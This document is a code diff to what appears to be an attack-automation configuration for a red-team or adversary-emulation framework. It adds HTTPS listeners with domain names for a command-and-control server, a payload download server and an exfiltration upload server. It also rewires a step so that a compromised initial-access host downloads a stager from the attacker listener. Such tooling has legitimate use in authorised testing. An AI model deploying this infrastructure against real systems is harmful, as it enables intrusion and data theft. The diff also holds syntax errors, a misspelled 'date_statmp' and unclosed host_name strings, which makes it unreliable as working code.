@@ -17,6 +17,10 @@ variable "private_cidr" {
     description = "Private address range. Scanning modules will scan this IP range."
 }
 
+variable "domain_name" {
+    description = "The domain name to be associated with the external facing listeners"
+}
+
 variable "c2_port" {
     description = "Port number to use for the C2 listener."
     default = "443"
@@ -137,6 +141,16 @@ resource "task" "c2_server" {
     }
 }
 
+resource "listener" "c2_listener" {
+    listener_name = "c2_listener_${local.function.date_statmp}"
+    listener_type = "HTTPS"
+    listener_port = variable.c2_port
+    task_name     = resource.task.c2_server.task_name
+    portgroups    = [resource.portgroup.c2_portgroup.portgroup_name]
+    host_name     = "c2_${resource.random_string.random_6.result}
+    domain_name   = variable.domain_name
+}
+
 resource "task" "http_server" {
     task_type  = "http_server"
     task_name  = "http_server_${local.function.date_stamp}"
@@ -156,6 +170,16 @@ resource "task" "http_server" {
             cert_host = "local_ip"
         }
     }
+}
+
+resource "listener" "http_listener" {
+    listener_name = "http_listener_${local.function.date_statmp}"
+    listener_type = "HTTPS"
+    listener_port = variable.http_port
+    task_name     = resource.task.http_server.task_name
+    portgroups    = [resource.portgroup.http_portgroup.portgroup_name]
+    host_name     = "downloads_${resource.random_string.random_6.result}
+    domain_name   = variable.domain_name
 }
 
 resource "task" "exfil_server" {
@@ -179,6 +203,16 @@ resource "task" "exfil_server" {
     }
 }
 
+resource "listener" "exfil_listener" {
+    listener_name = "exfil_listener_${local.function.date_statmp}"
+    listener_type = "HTTPS"
+    listener_port = variable.exfil_port
+    task_name     = resource.task.exfil_server.task_name
+    portgroups    = [resource.portgroup.exfil_portgroup.portgroup_name]
+    host_name     = "uploads_${resource.random_string.random_6.result}
+    domain_name   = variable.domain_name
+}
+
 resource "file" "stager_upload" {
     file_name     = resource.task.c2_server.stager.OutFile
     file_contents = resource.task.c2_server.stager.Output
@@ -191,7 +225,7 @@ action "download_from_workspace" "stager_download" {
 
 action "task_download_file" "download_stager" {
     task_name    = data.tasks.initial_access_task.task_name
-    url          = "${resource.task.http_server.url}/${action.download_from_workspace.stager_download.file_name}"
+    url          = "${resource.listener.http_listener.listener_type}://${resource.listener.http_listener.host_name}.${resource.listener.http_listener.domain_name}/${action.download_from_workspace.stager_download.file_name}"
     file_name    = action.download_from_workspace.stager_download.file_name
 }
 
